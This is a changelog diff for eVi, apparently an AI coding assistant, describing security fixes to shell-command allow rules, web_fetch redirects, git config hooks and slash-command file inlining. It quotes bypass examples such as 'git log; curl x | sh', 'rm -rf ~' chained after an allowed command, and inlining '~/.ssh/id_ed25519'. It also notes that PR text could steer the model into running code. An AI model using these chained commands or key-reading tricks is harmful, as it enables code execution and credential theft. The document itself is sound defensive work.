@@ -5,6 +5,116 @@ All notable user-visible changes to eVi. Format loosely follows
 
 ## [Unreleased]
 
+### Security
+- **Allowing one shell command no longer allows whatever is chained after it.**
+  Rules were matched against the whole line, so `allow run_command git*` also
+  approved `git log; curl x | sh`, and `destructive_allow =
+  ["*--force-with-lease*"]` exempted `rm -rf ~; git push --force-with-lease`.
+  eVi now splits the line into its commands the way the shell would. An allow
+  rule approves it only if every command is allowed, the line parses and its
+  redirects stay inside the working folder; `destructive_allow` exempts only
+  the commands it matches; `deny` rules and `hard_deny` catch a command
+  anywhere in the line. A line eVi can't follow (`bash -c "…"`, `eval`,
+  `curl x | sh`, an unbalanced quote, and on Windows any `%VAR%` or `for /f`)
+  is never approved by an allow rule that names a command. Expect more
+  prompts under such rules (`FOO=1 git log`, `if`/`for` blocks); a broad
+  `allow run_command` works as before. An allow rule no longer matches
+  `run_command`'s `cwd` argument. See "Shell command lines" in
+  docs/features/permissions-and-sandbox.md.
+- **`web_fetch` can no longer be steered to eVi itself, your LAN or a cloud
+  metadata service.** It followed redirects without checking them, so any web
+  page could send it to eVi's own API on `127.0.0.1:8473` or to
+  `169.254.169.254`, and it read the whole body before cutting it to 1 MB.
+  Loopback, private, link-local and metadata addresses are now refused unless
+  the host is in `[auto] trusted_domains` (eVi's own API port is refused even
+  then), every redirect is re-checked (at most 5), a public page can't
+  redirect into the LAN, and the body is capped as it streams, with a 60 s
+  limit. If you
+  `web_fetch` a LAN page (Home Assistant, SearXNG), add its host to
+  `trusted_domains`. `web_fetch` no longer uses `HTTP(S)_PROXY`.
+- **The managed runtime checks what it downloads.** The llama.cpp build and
+  catalog models were used as downloaded, the models from a moving `main`.
+  Each download is now checked against a sha256 pinned in eVi and discarded on
+  a mismatch before anything is extracted or run (`… failed verification`),
+  models come from a pinned commit, archives can't write outside their folder,
+  and a failed install leaves nothing half-installed. A catalog model already
+  on disk counts as installed only if it matches its pin, so the first check
+  after updating hashes each one once, and a file `evi models pull hf:` put
+  at the same path is replaced by the pinned one when you select that model.
+- **A repository you open can no longer run programs through eVi's own git
+  calls.** Its `.git/config` could make the git tools, `evi review`,
+  worktrees or the status line run a program through `core.fsmonitor`, hooks,
+  filter or diff drivers, the pager or `gpg.program`. Those are now off for
+  eVi's calls (filters and hooks from your global or system config, such as
+  Git LFS, still run). `evi worktree create` runs no hooks, not even your
+  global post-checkout, and skips LFS downloads (run `git lfs pull` after).
+  The git tools refuse refs starting with `-` and `git_diff` paths outside the
+  repository (which could read any file), refuse a bare repo or a
+  `core.worktree` that points elsewhere, and never run a `git.exe` from the
+  current folder. The destructive-command guard now asks before a shell line
+  sets `GIT_*` or `LD_PRELOAD` / `DYLD_*` variables. Plugin and skill installs
+  from a private HTTPS repo now need a credential helper.
+- **Slash commands no longer read files named in their arguments.**
+  `/explain @~/.ssh/id_ed25519` inlined the key into the prompt, and an MCP
+  client could do the same through a served prompt. Only `@path` refs written
+  in the command file itself are read, only inside the working folder or
+  `[auto] trusted_dirs`, and never a protected path or key/credential file;
+  MCP-served prompts never inline. Commands that relied on `@path` in their
+  arguments, on `@$1`, or on a file outside the working folder
+  (`@~/notes/style.md`) stop inlining it: add that folder to `trusted_dirs`.
+- **Notification text can't be read as AppleScript.** The macOS toast built
+  its AppleScript from the title and body, escaping only `"`. They are now
+  passed as arguments, and Linux `notify-send` gets `--` before them. eVi only
+  sends fixed text today, so this is hardening.
+
+### Changed
+- **The `evi-run` GitHub Action approves no tools unless you say so.** It
+  passed `--yes` on every run, so a prompt built from a PR diff or issue body
+  could get the model to read, write or run code on the runner. `auto_approve`
+  now defaults to `false` and the config the action writes approves no tool
+  category; set `auto_approve: "true"` for jobs that need tools. The prompt can
+  come from `prompt_file`, the config is written owner-only under
+  `$RUNNER_TEMP`, and `EVI_HOME` is no longer exported to later steps. The
+  PR-review example runs in `chat` mode with the diff in the prompt.
+- **A release waits for the browser tests and its CHANGELOG entry.** 1.0.49
+  reached PyPI with a dead button because a release ran only the unit suite.
+  The e2e suite now gates the PyPI publish (and runs on every push to main),
+  the tag must match the newest CHANGELOG entry, dated within a day, and the
+  GHCR image is published by the release after PyPI instead of on the tag by
+  itself. The desktop release runs the shell's Windows tests first and can run
+  the native-desktop smoke tests (`EVI_DESKTOP_E2E=true`). CI also fails a
+  workflow that pastes `${{ }}` into a script, and a change that adds a CLI
+  command or web route without touching `docs/` (label `docs-skip` to waive).
+  See docs/releasing.md and TESTING.md.
+
+### Added
+- **`evi chat --mode chat|cowork|code`** (`-m`) picks the session's tool
+  preset at launch, as `evi run --mode` does; an unknown mode exits 2.
+- **`evi doctor --dev`** checks a development checkout: the venv, git
+  `safe.directory`, pytest / ruff / Playwright, `pytest --collect-only` and
+  line endings. It prints the fix commands and never runs them; `--strict`
+  exits non-zero on a failure. Collection runs only for the eVi checkout
+  itself (it imports the checkout's `conftest.py`) unless you pass
+  `--collect`. `scripts/dev-bootstrap.sh` / `.ps1` set up a dev venv outside
+  the checkout and finish with this check; docs/self-build.md walks through
+  the loop.
+
+### Fixed
+- **An apostrophe no longer breaks a user slash command.** `/fix don't panic`
+  failed with "No closing quotation" (a server error in the web UI); an
+  unbalanced quote in the arguments now falls back to splitting on spaces.
+- **One unreadable command file no longer breaks the others.** A non-UTF-8
+  file in `~/.evi/commands` made `/help` and every user command fail. It is
+  now listed as `(unreadable: not UTF-8 text)`, and only that command fails,
+  with "can't run `/name`: …".
+- **The `evi-run` action's `version` input works.** It built
+  `evi-assistant==1.2.3[web,…]`, which pip rejects, so any pinned version
+  failed to install.
+- **CHANGELOG history repaired.** The lost headers of 1.0.2, 1.0.29, 1.0.31,
+  1.0.32 and 1.0.35 are back (their notes had read as part of the next
+  release), 0.32.0 has a reconstructed entry, and the dates of 1.0.10, 1.0.13
+  and 1.0.43–1.0.46 match their tags.
+
 ## [1.0.53] — 2026-10-09
 
 A security release. Update promptly, especially if you use the desktop app or
